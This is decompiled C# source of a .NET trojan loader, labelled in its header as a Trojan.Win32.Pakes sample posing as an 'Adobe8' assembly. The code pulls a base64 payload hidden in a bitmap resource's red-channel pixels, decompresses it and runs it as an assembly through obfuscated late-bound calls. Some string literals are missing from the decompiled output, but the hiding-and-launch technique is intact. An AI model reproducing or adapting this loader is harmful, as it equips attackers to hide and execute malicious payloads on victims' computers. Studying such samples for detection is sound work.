// Decompiled with JetBrains decompiler
// Type: <¬
// Assembly: Adobe8, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CC9D478A-E5DC-4ECF-AC7E-9A744313F8C7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.Pakes.snf-786c0f0942749383e883c0a3f69d54abb170ffb0ff93e36a3df7c76bec2de739.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
[SuppressIldasm]
internal sealed class \u003C\u00AC
{
  private static Assembly \u0040;
  private static byte[] \u003B;

  static \u003C\u00AC()
  {
    if (false)
      ;
    \u003C\u00AC.\u003B = \u003C\u00AC.\u0040();
    \u003C\u00AC.\u0040 = (Assembly) NewLateBinding.LateGet((object) null, typeof (Assembly), \u003C\u00AC.\u0040(.()), new object[1]
    {
      RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue((object) \u003C\u00AC.\u003B))
    }, (string[]) null, (System.Type[]) null, (bool[]) null);
  }

  public static byte[] \u0040()
  {
    if (false)
      ;
    return Encoding.Default.GetBytes(\u003C\u00AC.\u0040((Bitmap) new PictureBox()
    {
      Image = ((Image) new Bitmap(Assembly.GetExecutingAssembly().GetManifestResourceStream(.())))
    }.Image));
  }

  [STAThread]
  public static void \u003B()
  {
    if (false)
      ;
    \u003C\u00AC.\u003F();
  }

  public static object \u003F()
  {
    if (false)
      ;
    object obj;
    try
    {
      \u003C\u00AC.\u0040.GetType(\u003C\u00AC.\u0040(.()) + \u003C\u00AC.\u0040(.())).InvokeMember(\u003C\u00AC.\u0040(.()), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[0]);
      obj = (object) \u003C\u00AC.\u0040;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) Interaction.MsgBox((object) ex.Message);
      ProjectData.ClearProjectError();
    }
    return obj;
  }

  public static string \u0040([In] string obj0)
  {
    if (false)
      ;
    byte[] bytes = Encoding.UTF8.GetBytes(obj0);
    int num = checked (bytes.Length - 1);
    int index1 = 0;
    while (index1 <= num)
    {
      if (bytes[index1] > (byte) 31 && bytes[index1] < (byte) 127)
      {
        byte[] numArray = bytes;
        int index2 = index1;
        numArray[index2] = checked ((byte) unchecked ((int) numArray[index2] - (int) Convert.ToByte(checked (unchecked (index1 % 31) + 0))));
      }
      if (bytes[index1] < (byte) 31)
      {
        byte[] numArray = bytes;
        int index3 = index1;
        numArray[index3] = checked ((byte) ((int) numArray[index3] + 95));
      }
      checked { index1++; }
    }
    return Encoding.UTF8.GetString(bytes);
  }

  public static string \u0040([In] Bitmap obj0)
  {
    if (false)
      ;
    string s = (string) null;
    int num1 = checked (obj0.Height - 1);
    int y = 0;
    while (y <= num1)
    {
      int num2 = checked (obj0.Width - 1);
      int x = 0;
      while (x <= num2)
      {
        Color pixel = obj0.GetPixel(x, y);
        if (pixel.R != (byte) 0)
        {
          s += Conversions.ToString(Strings.ChrW((int) pixel.R));
          checked { x++; }
        }
        else
          break;
      }
      checked { ++y; }
    }
    byte[] numArray1 = Convert.FromBase64String(s);
    using (object Instance1 = (object) new MemoryStream())
    {
      int int32 = BitConverter.ToInt32(numArray1, 0);
      object Instance2 = Instance1;
      string MemberName1 = .();
      object[] objArray1 = new object[3]
      {
        (object) numArray1,
        (object) 4,
        (object) checked (numArray1.Length - 4)
      };
      object[] Arguments1 = objArray1;
      bool[] flagArray1 = new bool[3]{ true, false, false };
      bool[] CopyBack1 = flagArray1;
      NewLateBinding.LateCall(Instance2, (System.Type) null, MemberName1, Arguments1, (string[]) null, (System.Type[]) null, CopyBack1, true);
      if (flagArray1[0])
      {
        byte[] numArray2 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (byte[]));
      }
      object bytes = (object) new byte[checked (int32 - 1 + 1)];
      NewLateBinding.LateSetComplex(Instance1, (System.Type) null, .(), new object[1]
      {
        (object) 0
      }, (string[]) null, (System.Type[]) null, false, true);
      using (object obj = (object) new GZipStream((Stream) Instance1, CompressionMode.Decompress))
      {
        object Instance3 = obj;
        string MemberName2 = .();
        object[] objArray2 = new object[3]
        {
          RuntimeHelpers.GetObjectValue(bytes),
          (object) 0,
          null
        };
        object[] objArray3 = objArray2;
        object Instance4 = bytes;
        object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance4, (System.Type) null, .(), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
        objArray3[2] = objectValue;
        object[] objArray4 = objArray2;
        object[] Arguments2 = objArray4;
        bool[] flagArray2 = new bool[3]{ true, false, true };
        bool[] CopyBack2 = flagArray2;
        NewLateBinding.LateCall(Instance3, (System.Type) null, MemberName2, Arguments2, (string[]) null, (System.Type[]) null, CopyBack2, true);
        if (flagArray2[0])
          bytes = RuntimeHelpers.GetObjectValue(objArray4[0]);
        if (flagArray2[2])
          NewLateBinding.LateSetComplex(Instance4, (System.Type) null, .(), new object[1]
          {
            RuntimeHelpers.GetObjectValue(objArray4[2])
          }, (string[]) null, (System.Type[]) null, true, false);
      }
      return Encoding.UTF8.GetString((byte[]) bytes);
    }
  }
}
